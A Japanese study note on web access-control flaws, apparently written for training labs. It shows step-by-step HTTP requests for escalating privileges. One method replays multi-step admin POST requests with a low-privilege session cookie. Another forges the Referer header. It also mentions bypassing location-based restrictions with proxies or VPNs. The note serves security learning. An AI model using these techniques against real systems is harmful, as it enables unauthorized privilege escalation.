## multi-stepプロセスにおけるアクセス制御の脆弱性

#### 基本
###### multi-stepプロセスでアクセス制御の脆弱性が発生する原理

- 🚨現実でもあるあるの脆弱性

- 例えばユーザのメールアドレスを変更するプロセスを考える
	1. ユーザのプロフィールを開く
	2. 変更内容を送信する
	3. 変更内容を確認し、確定する

- このような場合、ステップ1と2は適切なアクセス制御が施されているにもかかわらず、ステップ3は適切なアクセス制御を行なっていないかもしれない。
- これは、開発者が「正当なプロセスを経た正当なユーザしかアクセスしないだろう」という暗黙の信頼をすることによる

###### multi-stepが採択されるケース

- 様々な入力やオプションを取得・保持する必要がある場合
- 処理実行前に確認が必要な場合

###### 対策

- すべてのステップでアクセス制御を組み込むこと

#### 悪用ステップ

###### 1. 1つの処理において何段階のプロセスがあるかを明らかにする

###### 2. 管理者権限の操作のうち、POSTリクエスト全てをRepeaterへ
```http
POST /admin-role HTTP/2
...
Cookie: session=xxx
...
username=carlos&action=upgrade
```

###### 3. 各段階のプロセスにて、アクセス制御の脆弱性がないか探索する

- 低権限のアカウントでログインし、発行されたCookie: sessionの値を入手する
```http
POST /login HTTP/2
...
Set-Cookie: session=yyy
...
username=wiener&password=peter
```

-  ステップ2でRepeaterへ送っておいた各段階のPOSTリクエストにあるsessionの値を、低権限のアカウントのsessionで上書きする
```http
POST /admin-role HTTP/2
...
Cookie: session=yyy
...
username=wiener&action=upgrade

```
 - これにより、この操作を低権限のアカウントで実行していることになる

## Refererヘッダによるアクセス制御バイパス

###### Refererヘッダによるアクセス制御の脆弱性の原理

- 開発者が「正当なプロセスを経たユーザのみがアクセスするだろう」というページのアクセス制御はRefererヘッダのみで行うケース
- Refererヘッダは遷移元のURLをサーバに伝える役割がある

#### 悪用ステップ

1. `Referer`ヘッダの値をIntruderで選択してScan。IssueのInformationに"Referer-dependent response"とあるか？
2. ターゲットのページへ正当なステップを踏んでアクセスした時のRefererヘッダの値を確認する

- 例えば`/admin-roles`というページへ正当な手順でアクセスすると以下の`Referer`になるとする
```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
...
Cookie: session=xxx
...
Referer: https://TARGET_NET/admin
```

3. 低権限のアカウントから直接ターゲットのページへアクセスし、Refererの値を正当な手順でアクセスした時の値へ変更する
```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
...
Cookie: session=[低権限のセッション値]
...
Referer: https://TARGET_NET/admin
```

#### (実践無)Locationによるアクセス制御概要

###### Locationを変更する

- プロキシ、VPN、クライアント側の地理的機能を変更することでバイパス

###### Locationによりアクセス制御を行うケース

- 国の法律やビジネス上の制限が適用されるケース
- 身近な例だと、日本ではNetflixでジブリが見れないなど
